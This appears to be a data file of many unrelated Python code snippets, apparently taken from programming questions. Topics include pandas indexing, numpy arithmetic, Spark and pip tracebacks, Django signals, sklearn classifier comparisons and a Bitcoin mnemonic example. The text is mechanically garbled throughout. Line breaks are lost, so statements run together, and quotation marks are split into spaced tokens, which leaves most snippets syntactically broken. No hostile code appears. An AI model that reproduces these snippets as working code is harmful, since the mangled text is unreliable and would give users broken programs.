def struct ( ) : passrecord = structrecord.number = 3record.name = `` Zoe '' class Struct : passrecord = Struct ( ) record.number = 3record.name = `` Zoe '' record = set ( ) record.number = 3AttributeError : 'set ' object has no attribute 'number'record = powpow.number = 3AttributeError : 'builtin_function_or_method ' object has no attribute 'number '
"import numpy as npimport pandas as pdidx = pd.IndexSliceindex = [ np.array ( [ 'foo ' , 'foo ' , 'qux ' , 'qux ' ] ) , np.array ( [ ' a ' , ' b ' , ' a ' , ' b ' ] ) ] columns = [ `` A '' , `` B '' ] df = pd.DataFrame ( np.random.randn ( 4 , 2 ) , index=index , columns=columns ) print dfprint df.loc [ idx [ 'foo ' , : ] , idx [ ' A ' : ' B ' ] ] A Bfoo a 0.676649 -1.638399 b -0.417915 0.587260qux a 0.294555 -0.573041 b 1.592056 0.237868 A Bfoo a -0.470195 -0.455713 b 1.750171 -0.409216 slice_1 = 'foo'slice_2 = ' : 'slice_list = [ slice_1 , slice_2 ] column_slice = `` ' A ' : ' B ' '' print df.loc [ idx [ slice_list ] , idx [ column_slice ] ]"
try : if x : return update ( 1 ) else : return update ( 2 ) finally : notifyUpdated ( )
"import subprocess def run_shell_command ( cmd , cwd=None ) : retVal = subprocess.Popen ( cmd , shell=True , stdout=subprocess.PIPE , cwd=cwd ) ; retVal = retVal.stdout.read ( ) .strip ( '\n ' ) ; return ( retVal ) ; output = run_shell_command ( `` echo 'Hello world ' '' )"
"import osimport pytzimport timeimport datetimeepoch = pytz.utc.localize ( datetime.datetime ( 1970 , 1 , 1 ) ) print time.mktime ( epoch.timetuple ( ) ) os.environ [ 'TZ ' ] = 'UTC+0'time.tzset ( ) print time.mktime ( epoch.timetuple ( ) ) Python 2.6.4 ( r264:75706 , Dec 25 2009 , 08:52:16 ) [ GCC 4.2.1 ( Apple Inc. build 5646 ) ( dot 1 ) ] on darwinType `` help '' , `` copyright '' , `` credits '' or `` license '' for more information. > > > import os > > > import pytz > > > import time > > > import datetime > > > > > > epoch = pytz.utc.localize ( datetime.datetime ( 1970 , 1 , 1 ) ) > > > print time.mktime ( epoch.timetuple ( ) ) 25200.0 > > > > > > os.environ [ 'TZ ' ] = 'UTC+0 ' > > > time.tzset ( ) > > > print time.mktime ( epoch.timetuple ( ) ) 0.0"
"testEng = '' This is English '' lang = Detector ( testEng ) print ( lang.language ) df [ 'Text-Lang ' , 'Text-LangConfidence ' ] = df.Text.apply ( Detector )"
"15/06/18 08:11:16 INFO spark.SparkContext : Successfully stopped SparkContextTraceback ( most recent call last ) : File `` /usr/lib/spark_1.2.1/spark-1.2.1-bin-hadoop2.4/python/pyspark/shell.py '' , line 45 , in < module > sc = SparkContext ( appName= '' PySparkShell '' , pyFiles=add_files ) File `` /usr/lib/spark_1.2.1/spark-1.2.1-bin-hadoop2.4/python/pyspark/context.py '' , line 105 , in __init__ conf , jsc ) File `` /usr/lib/spark_1.2.1/spark-1.2.1-bin-hadoop2.4/python/pyspark/context.py '' , line 157 , in _do_init self._accumulatorServer = accumulators._start_update_server ( ) File `` /usr/lib/spark_1.2.1/spark-1.2.1-bin-hadoop2.4/python/pyspark/accumulators.py '' , line 269 , in _start_update_server server = AccumulatorServer ( ( `` localhost '' , 0 ) , _UpdateRequestHandler ) File `` /usr/lib64/python2.6/SocketServer.py '' , line 402 , in __init__ self.server_bind ( ) File `` /usr/lib64/python2.6/SocketServer.py '' , line 413 , in server_bind self.socket.bind ( self.server_address ) File `` < string > '' , line 1 , in bindsocket.gaierror : [ Errno -2 ] Name or service not known > > > 15/06/18 08:11:16 INFO remote.RemoteActorRefProvider $ RemotingTerminator : Shutting down remote daemon.15/06/18 08:11:16 INFO remote.RemoteActorRefProvider $ RemotingTerminator : Remote daemon shut down ; proceeding with flushing remote transports ."
// Valid JSON { `` foo '' : '' bar '' } # Pythonjson_dict = eval ( ' { `` foo '' : '' bar '' } ' )
"import randomclass markov : memory = { } separator = ' ' order = 2 def getInitial ( self ) : ret = [ ] for i in range ( 0 , self.order , 1 ) : ret.append ( `` ) return ret def breakText ( self , txt , cb ) : parts = txt.split ( self.separator ) prev = self.getInitial ( ) def step ( self ) : cb ( prev , self.next ) prev.shift ( ) # Javascript function . prev.append ( self.next ) # parts.forEach ( step ) # - step is the function above . cb ( prev , `` ) def learn ( self , txt ) : mem = self.memory def learnPart ( key , value ) : if not mem [ key ] : mem [ key ] = [ ] mem [ key ] = value return mem self.breakText ( txt , learnPart ) def step ( self , state , ret ) : nextAvailable = self.memory [ state ] or [ `` ] self.next = nextAvailable [ random.choice ( nextAvailable.keys ( ) ) ] if not self.next : return ret ret.append ( next ) nextState = state.slice ( 1 ) return self.step ( nextState , ret ) def ask ( self , seed ) : if not seed : seed = self.genInitial ( ) seed = seed + self.step ( seed , [ ] ) .join ( self.separator ) return seed"
"signals.post_save.disconnect ( receiver=MessageFolder , sender=Message ) email_message = EmailMessage ( subject , message , my_username , [ recipent , ] , [ ] , # [ 'bcc @ example.com ' ] , headers = { 'Reply-To ' : 'gusreyes01 @ example.com ' } ) signals.post_save.connect ( MessageFolder , MessageFolder.assign_message_folder ) # Save it my_mailbox.record_outgoing_message ( email_message.message ( ) ) class MessageFolder ( models.Model ) : folder = models.ForeignKey ( Folder , null = True , blank = True ) message = models.ForeignKey ( Message , null = True , blank = True ) @ receiver ( ( post_save ) , sender=Message , dispatch_uid= '' assign_message_folder '' ) def assign_message_folder ( sender , instance , created , **kwargs ) : if not created : return else : # generate MessageFolder & & UserFolder if ( instance.outgoing ) : message_folder = MessageFolder ( None , 2 , instance.pk ) else : message_folder = MessageFolder ( None , 1 , instance.pk ) message_folder.save ( ) return"
"api.add_error_handler ( Exception , handler=lambda e , *_ : exec ( 'raise falcon.HTTPInternalServerError ( `` Internal Server Error '' , `` Some error '' ) ' ) )"
"$ pip search docker-composeException : Traceback ( most recent call last ) : File `` /Library/Python/2.7/site-packages/pip/basecommand.py '' , line 223 , in main status = self.run ( options , args ) File `` /Library/Python/2.7/site-packages/pip/commands/search.py '' , line 43 , in run pypi_hits = self.search ( query , options ) File `` /Library/Python/2.7/site-packages/pip/commands/search.py '' , line 60 , in search hits = pypi.search ( { 'name ' : query , 'summary ' : query } , 'or ' ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/xmlrpclib.py '' , line 1240 , in __call__ return self.__send ( self.__name , args ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/xmlrpclib.py '' , line 1599 , in __request verbose=self.__verbose File `` /Library/Python/2.7/site-packages/pip/download.py '' , line 788 , in request return self.parse_response ( response.raw ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/xmlrpclib.py '' , line 1490 , in parse_response return u.close ( ) File `` /System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/xmlrpclib.py '' , line 799 , in close raise Fault ( **self._stack [ 0 ] ) Fault : < Fault 1 : `` < type 'exceptions.KeyError ' > : 'hits ' '' > sudo -H pip install -- force-reinstall -U pip sudo -H pip install -- force-reinstall -U pip==7.1.0 You are using pip version 7.1.0 , however version 7.1.2 is available.You should consider upgrading via the 'pip install -- upgrade pip ' command . pip search docker-compose -- no-cache-dir -- disable-pip-version-check"
"int PyArg_ParseTupleAndKeywords ( PyObject *arg , PyObject *kwdict , char *format , char **kwlist , ... ) ; static char *kwlist [ ] = { `` voltage '' , `` state '' , `` action '' , `` type '' , NULL } ; warning : deprecated conversion from string constant to ‘ char* ’"
"def my_func ( *args ) : return reduce ( ( lambda x , y : x + y ) , args ) my_func ( 1,2,3,4 ) add = lambda *args : //code for adding all of args add ( 5 ) ( 10 ) # it should output 15add ( 1 ) ( 15 ) ( 20 ) ( 4 ) # it should output 40"
"entropy > nmemonic > seed > public/private keys > public address import stringfrom random import SystemRandom , randrangefrom binascii import hexlify , unhexlifyfrom moneywagon import generate_keypairfrom mnemonic import mnemonicdef gen_rand ( ) : foo = SystemRandom ( ) length = 32 chars = string.hexdigits return `` .join ( foo.choice ( chars ) for _ in range ( length ) ) mnemo = mnemonic.Mnemonic ( 'english ' ) entropy = gen_rand ( ) # entropy = '00000000000000000000000000000000'words = mnemo.to_mnemonic ( unhexlify ( entropy ) ) seed = hexlify ( mnemo.to_seed ( words , passphrase='apassphrase ' ) ) address = generate_keypair ( 'btc ' , seed ) print ( words ) print ( seed ) print ( address [ 'public ' ] [ 'address ' ] ) print ( address [ 'private ' ] [ 'hex ' ] ) abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon aboutb'05de15fb96dc0ab9f03c9d411bf84c586c72e7c30bddd413a304896f9f994ea65e7fcafd2c6b796141e310850e5f30b6abc2e6aec79a8ff81f4ba38fde81c403'15GyM1xxxxxxxxxxxxxxxxxxxxxxTXrrvG8ede10xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxcae501"
"$ pattern = re.compile ( ' ( ? P < group1 > AAA|BBB|CCC ) | ( ? P < group2 > DDD|EEE|FFF ) ' ) $ match.groupdict ( ) $ { 'group1 ' : None , 'group2 ' : 'DDD ' }"
foo : int = 5 from __future__ import variable_annotations
"Location , Transport , Transport1 , DateOccurred , CostCentre , D_Time , count0 , Lorry , Car,07/09/2012,0,0:00:00,21 , Lorry , Car,11/09/2012,0,0:00:00,52 , Lorry , Car,14/09/2012,0,0:00:00,303 , Lorry , Car,14/09/2012,0,0:07:00,24 , Lorry , Car,14/09/2012,0,0:29:00,15 , Lorry , Car,14/09/2012,0,3:27:00,36 , Lorry , Car,14/09/2012,0,3:28:00,47 , Lorry , Car,21/09/2012,0,0:00:00,138 , Lorry , Car,27/09/2012,0,0:00:00,89 , Lorry , Car,28/09/2012,0,0:02:00,110 , Train , Bus,03/09/2012,2073,7:49:00,111 , Train , Bus,05/09/2012,2073,7:50:00,112 , Train , Bus,06/09/2012,2073,7:52:00,113 , Train , Bus,07/09/2012,2073,7:48:00,114 , Train , Bus,08/09/2012,2073,7:55:00,115 , Train , Bus,11/09/2012,2073,7:49:00,116 , Train , Bus,12/09/2012,2073,7:52:00,117 , Train , Bus,13/09/2012,2073,7:50:00,118 , Train , Bus,14/09/2012,2073,7:54:00,119 , Train , Bus,18/09/2012,2073,7:51:00,120 , Train , Bus,19/09/2012,2073,7:50:00,121 , Train , Bus,20/09/2012,2073,7:51:00,122 , Train , Bus,21/09/2012,2073,7:52:00,123 , Train , Bus,22/09/2012,2073,7:53:00,124 , Train , Bus,23/09/2012,2073,7:49:00,125 , Train , Bus,24/09/2012,2073,7:54:00,126 , Train , Bus,25/09/2012,2073,7:55:00,127 , Train , Bus,26/09/2012,2073,7:53:00,128 , Train , Bus,27/09/2012,2073,7:55:00,129 , Train , Bus,28/09/2012,2073,7:53:00,130 , Train , Bus,29/09/2012,2073,7:56:00,1 df_SOF1 = read_csv ( '/users/fabulous/documents/df_SOF1.csv ' , index_col=3 , parse_dates=True ) # read file from disk df_SOF1.groupby ( 'Location ' ) .sum ( ) D_Time"
"spark-submit \ -- deploy-mode cluster \ -- class com.app.myApp \ -- master k8s : //https : //myCluster.com \ -- conf spark.kubernetes.authenticate.driver.serviceAccountName=spark \ -- conf spark.app.name=myApp \ -- conf spark.executor.instances=10 \ -- conf spark.kubernetes.container.image=myImage \ local : ///myJar.jar request = requests.Request ( 'POST ' , `` http : // < master-ip > :6066/v1/submissions/create '' , data=json.dumps ( parameters ) ) prepared = request.prepare ( ) session = requests.Session ( ) response = session.send ( prepared ) request = requests.Request ( 'POST ' , `` k8s : //https : //myK8scluster.com:443 '' , data=json.dumps ( parameters ) )"
"> > > for x in object , int , float , str , list , dict : ... print ( f ' { x.__name__:6 } : { x.__bases__ } ' ) ... object : ( ) int : ( < class 'object ' > , ) float : ( < class 'object ' > , ) str : ( < class 'object ' > , ) list : ( < class 'object ' > , ) dict : ( < class 'object ' > , ) > > > for x in object , int , float , str , list , dict : ... print ( f ' { x.__name__:6 } : { x.__class__ } ' ) ... object : < class 'type ' > int : < class 'type ' > float : < class 'type ' > str : < class 'type ' > list : < class 'type ' > dict : < class 'type ' > > > > type.__class__ < class 'type ' > > > > type.__bases__ ( < class 'object ' > , ) > > > isinstance ( object , type ) True > > > isinstance ( type , object ) True > > > isinstance ( type , type ) True > > > isinstance ( object , object ) True > > > issubclass ( type , object ) True > > > issubclass ( object , type ) False"
"[ ( 20 , { ' a ' : ' b ' } ) , ( 21 , { ' a ' : ' b ' } ) , ( 22 , { ' a ' : ' b ' } ) , ( 23 , { ' a ' : ' b ' } ) ] min = 20max = 23data = { `` a '' : `` b '' } result = [ ] for i in range ( min , max + 1 ) : result.append ( ( i , data ) ) print ( result )"
s = `` hello '' print s [ : :-1 ]
"# This will return a dictionary with the values of the surrounding pointsdef get_next_values ( self , column , row ) : if not ( column < self.COLUMNS and row < self.ROWS ) : print `` Invalid row/column . '' return False nextHorizIsIndex = True if column < self.COLUMNS - 2 else False nextVertIsIndex = True if row < self.ROWS - 2 else False n = self.board [ column , row-1 ] if column > 0 else None ne = self.board [ column+1 , row-1 ] if nextHorizIsIndex else None e = self.board [ column+1 , row ] if nextHorizIsIndex else None se = self.board [ column+1 , row+1 ] if nextHorizIsIndex and nextVertIsIndex else None s = self.board [ column , row+1 ] if nextVertIsIndex else None sw = self.board [ column-1 , row+1 ] if nextVertIsIndex else None w = self.board [ column-1 , row ] if row > 0 else None nw = self.board [ column-1 , row-1 ] if 0 not in [ row , column ] else None # debug print n , ne , e , se , s , sw , w , nw"
"# # For example- going from-Var1 =15Var2 = 26Var3 = 922 # # To-Var1 , Var2 , Var3 = 15 , 26 , 922 User_Input += Master_Key [ Input_ref ] Key += Master_Key [ Key_ref ] Key2 += Master_Key [ Key_2_Ref ] # # Which looks like-User_Input , Key , Key2 += Master_Key [ Input_Ref ] , Master_Key [ Key_Ref ] , Master_Key [ Key_2_Ref ] SyntaxError : illegal expression for augmented assignment"
"import numpy as nprows_a , rows_v , cols = ( 10 , 15 , 3 ) a = np.arange ( rows_a*cols ) .reshape ( rows_a , cols ) v = np.arange ( rows_v*cols ) .reshape ( rows_v , cols ) c = 0for i in range ( len ( v ) ) : D = ( ( a-v [ i ] ) **2 ) .sum ( axis=-1 ) c += D.min ( ) print ( c )"
import numpy as np a = 0.0print a / ab = np.array ( [ 0.0 ] ) print b [ 0 ] / b [ 0 ]
"def prelogin ( ) : email = request.args.get ( 'email ' ) if not email : return `` , 204 user = User.query.filter ( { 'email ' : email } ) .first ( ) if not user : return `` , 204 address = current_app.config [ 'UPLOADED_PHOTOS_URL ' ] try : mongo_photo = pymongo.db.photos.find_one ( user.photo ) photo = address + mongo_photo [ 'file ' ] except ( KeyError , AttributeError ) : photo = None return jsonify ( { 'email ' : email , 'fullname ' : user.fullname , 'photo ' : photo } ) @ patch ( 'arounded.userv2.views.User ' ) @ patch ( 'arounded.userv2.views.pymongo ' ) def test_valid_prelogin ( self , mock_user , mock_pymongo ) : user_config = { 'filter.return_value.first.return_value.fullname ' : 'Someone ' } mock_user.query.configure_mock ( **user_config ) mock_pymongo.db.photos.find_one.return_value = { 'file ' : 'no-photo.png ' } response = self.client.get ( '/api/v2/users/prelogin ? email=someone @ example.com ' ) self.assert_status ( response , 200 ) arounded/userv2/views.py line 40 in prelogin 'photo ' : photo/home/sputnikus/.virtualenvs/arounded_site2/lib/python2.7/site-packages/flask_jsonpify.py line 60 in jsonpify indent=None if request.is_xhr else 2 ) ) , /usr/lib64/python2.7/json/__init__.py line 250 in dumps sort_keys=sort_keys , **kw ) .encode ( obj ) /usr/lib64/python2.7/json/encoder.py line 209 in encode chunks = list ( chunks ) /usr/lib64/python2.7/json/encoder.py line 434 in _iterencode for chunk in _iterencode_dict ( o , _current_indent_level ) : /usr/lib64/python2.7/json/encoder.py line 408 in _iterencode_dict for chunk in chunks : /usr/lib64/python2.7/json/encoder.py line 442 in _iterencode o = _default ( o ) /usr/lib64/python2.7/json/encoder.py line 184 in default raise TypeError ( repr ( o ) + `` is not JSON serializable '' ) TypeError : < MagicMock name='pymongo.db.photos.find_one ( ) .__getitem__ ( ) .__radd__ ( ) ' id='67038032 ' > is not JSON serializable"
$ git clone https : //github.com/sontek/dotfiles.git $ cd dotfiles $ ./install.sh vim
class Fum ( object ) : foo = Foo ( ) bar = Bar ( ) fum = Fum ( ) def raiser ( ) : raise AttributeError ( `` Do n't use this attribute on this object . Its disabled for X reason . `` ) fum.bar = property ( raiser ) > > > fum.bar > > > < property object at 0xb0b8b33f >
"> > > a = np.ones ( 1000 , dtype=np.float128 ) +1e-14 > > > ( a*a ) .sum ( ) 1000.0000000000199999 > > > np.dot ( a , a ) 1000.0000000000199948 > > > a = np.ones ( 1000 , dtype=np.float64 ) +1e-14 > > > ( a*a ) .sum ( ) 1000.0000000000198 > > > np.dot ( a , a ) 1000.0000000000176"
"foo = range ( 7 ) bar = [ n for i , n in enumerate ( foo ) if n % 2 == len ( foo ) % 2 ] bar += [ n for n in reversed ( foo ) if n not in bar ] bar [ 1 , 3 , 5 , 6 , 4 , 2 , 0 ]"
"> > > now = datetime.utcnow ( ) > > > now = now.isoformat ( `` T '' ) + `` Z '' > > > now'2017-06-01T13:05:32.586760Z ' > > > timestamp_from_bigquery'datetime.datetime ( 2017 , 5 , 31 , 16 , 13 , 26 , 252000 , tzinfo= < UTC > ) ' > > > timestamp_from_bigquery.isoformat ( `` T '' ) + `` Z '' '2017-05-31T16:13:26.252000+00:00Z ' > > > timestamp_from_bigquery.replace ( tzinfo=None ) '2017-05-31T16:13:26.252000+00:00Z '"
"import numpy as npimport matplotlib.pyplot as pltfrom matplotlib.transforms import BlendedGenericTransformfig , ax = plt.subplots ( ) ax.text ( 0 , -0.02 , ' y ' , transform=BlendedGenericTransform ( ax.transData , ax.transAxes ) , ha='center ' ) ax.text ( 1.01 , 0 , ' x ' , transform=BlendedGenericTransform ( ax.transAxes , ax.transData ) , va='center ' ) ax.set_xticks ( np.arange ( 0 , side+1,1 ) ) ax.set_yticks ( np.arange ( 0 , side+1,1 ) ) plt.grid ( ) ax.xaxis.tick_top ( ) plt.gca ( ) .invert_yaxis ( ) circle = plt.Circle ( ( 15 , 15 ) , radius=15 , fc= ' w ' ) plt.gca ( ) .add_patch ( circle ) fig.set_size_inches ( 18.5 , 10.5 )"
"* I know this will introduce some artifacts . ** Combining virtualenv and pip freeze goes some way to solving this , but it 's still not what I am looking for ."
"df.head ( ) album_id categories split_categories 0 66562 480.494 [ 480 , 494 ] 1 114582 128 [ 128 ] 2 4846 5 [ 5 ] 3 1709 9 [ 9 ] 4 59239 105.104 [ 105 , 104 ] album_id categories split_categories0 66562 480.494 [ 480 , 494 ] 3 1709 9 [ 9 ] 4 59239 105.104 [ 105 , 104 ] def match_categories ( row ) : selected_categories = [ 480 , 9 , 104 ] result = [ int ( i ) for i in row [ 'split_categories ' ] if i in selected_categories ] return resultdf [ 'matched_categories ' ] = df.apply ( match_categories , axis=1 ) df [ ~ ( df [ 'split_categories ' ] .anyvalue.isin ( [ 480 , 9 , 104 ] ) ) ]"
Used * or ** magic ( star-args ) @ propertydef version_string ( self ) : `` 'Return the version as a string . ' '' try : version_format = self.xml.version.get ( `` format '' ) except AttributeError : return None version_values = ( v.text for v in self.xml.version.v ) return version_format.format ( *version_values )
"# Initial dictionarymyData = { 'apple ' : ' 1 ' , 'banana ' : ' 2 ' , 'house ' : ' 3 ' , 'car ' : ' 4 ' , 'hippopotamus ' : ' 5 ' } # Create the container classclass Struct : def __init__ ( self , **entries ) : self.__dict__.update ( entries ) # Finally create the instance and bind the dictionary to itk = Struct ( **myData ) print k.apple 1 class Struct : def __init__ ( self , **entries ) : self.__dict__.update ( entries ) def testMe ( self ) : self.myVariable = 67 k.testMe ( ) print k.__dict__ { 'apple ' : ' 1 ' , 'house ' : ' 3 ' , 'myVariable ' : 67 , 'car ' : ' 4 ' , 'banana ' : ' 2 ' , 'hippopotamus ' : ' 5 ' }"
"SBC = solve ( sqrt ( ( xa-x ) ^ ( 2 ) + ( ya-y ) ^ ( 2 ) ) -sqrt ( ( xb-x ) ^ ( 2 ) + ( yb-y ) ^ ( 2 ) ) -D12==0 , sqrt ( ( xa-x ) ^ ( 2 ) + ( ya-y ) ^ ( 2 ) ) -sqrt ( ( xc-x ) ^ ( 2 ) + ( yc-y ) ^ ( 2 ) ) -D13==0 , [ x , y ] ) ; sbc = solve ( sqrt ( ( xa - x ) ** ( 2 ) + ( ya - y ) ** ( 2 ) ) - sqrt ( ( xb - x ) ** ( 2 ) + ( yb - y ) ** ( 2 ) ) - D12 == 0 , sqrt ( ( xa - x ) ** ( 2 ) + ( ya - y ) ** ( 2 ) ) - sqrt ( ( xc - x ) ** ( 2 ) + ( yc - y ) ** ( 2 ) ) - D13 == 0 , [ x , y ] ) # -*- coding : utf-8 -*-from sympy import *def alg ( xa=None , ya=None , za=None , Ta=None , xb=None , yb=None , zb=None , Tb=None , xc=None , yc=None , zc=None , Tc=None , xd=None , yd=None , zd=None , Td=None , RSSIA=None , RSSIB=None , RSSIC=None , RSSID=None , txPower=None , n=None ) : n = 2 c = 3 * 10 ** 8 TOA12 = Ta - Tb TOA13 = Ta - Tc TOA14 = Ta - Td D12 = TOA12 * c D13 = TOA13 * c D14 = TOA14 * c x , y = symbols ( ' x y ' ) eqs = [ sqrt ( ( xa - x ) ** ( 2 ) + ( ya - y ) ** ( 2 ) ) - sqrt ( ( xb - x ) ** ( 2 ) + ( yb - y ) ** ( 2 ) ) - D12 , sqrt ( ( xa - x ) ** ( 2 ) + ( ya - y ) ** ( 2 ) ) - sqrt ( ( xc - x ) ** ( 2 ) + ( yc - y ) ** ( 2 ) ) - D13 ] print solve ( eqs , [ x , y ] ) alg ( 3,1,0,21.8898790015,4,6,0,21.8898790005,10,4,0,21.88987900009,9,0.5,0,21.889879000105,23.9,23.85,23.9,23.95,24,1 )"
"l = [ True , False , False , True ] def check_filter ( l ) : if len ( [ i for i in filter ( None , l ) ] ) > 1 : return Truereturn False"
"from palettable.cartocolors.diverging import TealRose_7import matplotlib as mplimport seaborn as snsstart_color = `` # 009392 '' end_color = `` # d0587e '' # https : //learnui.design/tools/data-color-picker.html # palettecolors = [ ' # 009392 ' , ' # 0091b2 ' , ' # 2b89c8 ' , ' # 7c7ac6 ' , ' # b366ac ' , ' # d0587e ' ] sns.palplot ( colors )"
set editing-mode vi
"d = { } d [ [ 1,2,3 ] ] = 4"
"documentTermMatrix = array ( [ [ 0. , 1. , 0. , 1. , 1. , 0. , 1 . ] , [ 0. , 1. , 1. , 0. , 0. , 0. , 0 . ] , [ 0. , 0. , 0. , 0. , 0. , 1. , 1 . ] , [ 0. , 0. , 0. , 1. , 0. , 0. , 0 . ] , [ 0. , 1. , 1. , 0. , 0. , 0. , 0 . ] , [ 1. , 0. , 0. , 1. , 0. , 0. , 0 . ] , [ 0. , 0. , 0. , 0. , 1. , 1. , 0 . ] , [ 0. , 0. , 1. , 1. , 0. , 0. , 0 . ] , [ 1. , 0. , 0. , 1. , 0. , 0. , 0 . ] ] ) u , s , vt = linalg.svd ( documentTermMatrix , full_matrices=False ) sigma = diag ( s ) # # remove extra dimensions ... numberOfDimensions = 4for i in range ( 4 , len ( sigma ) -1 ) : sigma [ i ] [ i ] = 0queryVector = array ( [ [ 0 . ] , # same as first column in documentTermMatrix [ 0 . ] , [ 0 . ] , [ 0 . ] , [ 0 . ] , [ 1 . ] , [ 0 . ] , [ 0 . ] , [ 1 . ] ] ) dtMatrixToQueryAgainst = dot ( u , dot ( s , vt ) ) queryVector = dot ( inv ( s ) , dot ( transpose ( u ) , queryVector ) ) similarityToFirst = cosineDistance ( queryVector , dtMatrixToQueryAgainst [ : ,0 ] # gives 'matrices are not aligned ' error . should be 1 because they 're the same dtMatrixToQueryAgainst = dot ( s , vt ) queryVector = dot ( transpose ( u ) , queryVector ) similarityToFirst = cosineDistance ( queryVector , dtMatrixToQueryAgainsst [ : ,0 ] ) # gives 1 , which is correct"
C /A -- \ B if flag==1 x=5end C / \A -- D \ / B if flag==1 x=6end
< node1 > < node2 > < node3 > foo < /node3 > < /node2 > < /node1 > < node1 > < node2 > < node3 > foo < /node3 > < /node2 > < /node1 >
"extra_indices = [ ] for i in range ( len ( indices ) ) : index = indices [ i ] extra_indices.extend ( [ index , index + 1 , index +2 ] )"
"from itertools import productimport numpy as npfrom sklearn.svm import SVCfrom sklearn.tree import DecisionTreeClassifierfrom sklearn.ensemble import RandomForestClassifier , AdaBoostClassifierfrom sklearn.naive_bayes import GaussianNB , MultinomialNBfrom sklearn.discriminant_analysis import LinearDiscriminantAnalysisfrom sklearn.discriminant_analysis import QuadraticDiscriminantAnalysisfrom sklearn.datasets import make_classificationfrom sklearn.preprocessing import StandardScalerfrom sklearn.cross_validation import train_test_splitnames = [ `` Linear SVM '' , `` Decision Tree '' , `` Random Forest '' , `` AdaBoost '' , `` Naive Bayes '' , `` Linear Discriminant Analysis '' , `` Quadratic Discriminant Analysis '' ] def griddy_mcsearchface ( num_samples , num_feats , num_feats_to_remove ) : classifiers = [ SVC ( kernel= '' linear '' , C=0.025 ) , DecisionTreeClassifier ( max_depth=5 ) , RandomForestClassifier ( max_depth=5 , n_estimators=10 , max_features=1 ) , AdaBoostClassifier ( ) , GaussianNB ( ) , LinearDiscriminantAnalysis ( ) , QuadraticDiscriminantAnalysis ( ) ] classifiers2 = [ SVC ( kernel= '' linear '' , C=0.025 ) , DecisionTreeClassifier ( max_depth=5 ) , RandomForestClassifier ( max_depth=5 , n_estimators=10 , max_features=1 ) , AdaBoostClassifier ( ) , GaussianNB ( ) , LinearDiscriminantAnalysis ( ) , QuadraticDiscriminantAnalysis ( ) ] X , y = make_classification ( n_samples=num_samples , n_features=num_feats , n_redundant=0 , n_informative=2 , random_state=1 , n_clusters_per_class=1 ) X = StandardScaler ( ) .fit_transform ( X ) X_train , X_test , y_train , y_test = train_test_split ( X , y , test_size=.2 ) for name , clf , clf2 in zip ( names , classifiers , classifiers2 ) : clf.fit ( X_train , y_train ) score = clf.score ( X_test , y_test ) # Remove 40 % of the features . clf2.fit ( X_train [ : , : -num_feats_to_remove ] , y_train ) score2 = clf2.score ( X_test [ : , : -num_feats_to_remove ] , y_test ) yield ( num_samples , num_feats , num_feats_to_remove , name , score , score2 ) _samples = [ 100 , 200 , 500 , 1000 , 2000 , 5000 , 10000 , 20000 , 50000 , 100000 ] _feats = [ 10 , 20 , 50 , 100 , 200 , 500 , 10000 ] _feats_to_rm = [ 5 , 10 , 25 , 50 , 100 , 250 ] for num_samples , num_feats , num_feats_to_remove in product ( _samples , _feats , _feats_to_rm ) : if num_feats < = num_feats_to_remove : continue for i in griddy_mcsearchface ( num_samples , num_feats , num_feats_to_remove ) : print ( i ) ( 100 , 10 , 5 , 'Linear SVM ' , 1.0 , 0.40000000000000002 ) ( 100 , 10 , 5 , 'Decision Tree ' , 1.0 , 0.65000000000000002 ) ( 100 , 10 , 5 , 'Random Forest ' , 1.0 , 0.90000000000000002 ) ( 100 , 10 , 5 , 'AdaBoost ' , 1.0 , 0.65000000000000002 ) ( 100 , 10 , 5 , 'Naive Bayes ' , 1.0 , 0.75 ) ( 100 , 10 , 5 , 'Linear Discriminant Analysis ' , 1.0 , 0.40000000000000002 ) ( 100 , 10 , 5 , 'Quadratic Discriminant Analysis ' , 1.0 , 0.84999999999999998 ) ( 100 , 20 , 5 , 'Linear SVM ' , 1.0 , 1.0 ) ( 100 , 20 , 5 , 'Decision Tree ' , 0.94999999999999996 , 0.94999999999999996 ) ( 100 , 20 , 5 , 'Random Forest ' , 0.80000000000000004 , 0.75 ) ( 100 , 20 , 5 , 'AdaBoost ' , 1.0 , 0.94999999999999996 ) ( 100 , 20 , 5 , 'Naive Bayes ' , 1.0 , 1.0 ) ( 100 , 20 , 5 , 'Linear Discriminant Analysis ' , 1.0 , 1.0 ) ( 100 , 20 , 5 , 'Quadratic Discriminant Analysis ' , 0.84999999999999998 , 0.94999999999999996 ) ( 100 , 20 , 10 , 'Linear SVM ' , 0.94999999999999996 , 0.65000000000000002 ) ( 100 , 20 , 10 , 'Decision Tree ' , 0.94999999999999996 , 0.59999999999999998 ) ( 100 , 20 , 10 , 'Random Forest ' , 0.75 , 0.69999999999999996 ) ( 100 , 20 , 10 , 'AdaBoost ' , 0.94999999999999996 , 0.69999999999999996 ) ( 100 , 20 , 10 , 'Naive Bayes ' , 0.94999999999999996 , 0.75 )"
"class Point ( object ) : def __init__ ( self ) : self.x = 0 self.y = 0 Point.__setattr__ = self._setattr def _setattr ( self , name , value ) : if not hasattr ( self , name ) : raise AttributeError ( `` ' '' + name + `` ' not an attribute of Point object . '' ) else : super ( Point , self ) .__setattr__ ( name , value ) class attr_block_meta ( type ) : def __new__ ( meta , cname , bases , dctry ) : def _setattr ( self , name , value ) : if not hasattr ( self , name ) : raise AttributeError ( `` ' '' + name + `` ' not an attribute of `` + cname + `` object . '' ) object.__setattr__ ( self , name , value ) dctry.update ( { ' x ' : 0 , ' y ' : 0 } ) cls = type.__new__ ( meta , cname , bases , dctry ) cls.__setattr__ = _setattr return clsclass ImPoint ( object ) : __metaclass__ = attr_block_meta"
class Sample : variable = 2object1 = Sample ( ) object2 = Sample ( ) print object1.variable # 2print object2.variable # 2object1.variable = 1print object1.variable # 1print object2.variable # 2 < - why not 1 too ?
"x = mx.sym.Variable ( ' x ' ) y = mx.sym.Variable ( ' y ' ) z = x + y ,"
"for M in ... . : np.random.randint ( 2 , size= ( n , n ) )"
"> > > from scipy.stats import binom > > > rv = binom ( n , p ) > > > import numpy as np > > > s = np.random.binomial ( n , p , 1000 )"
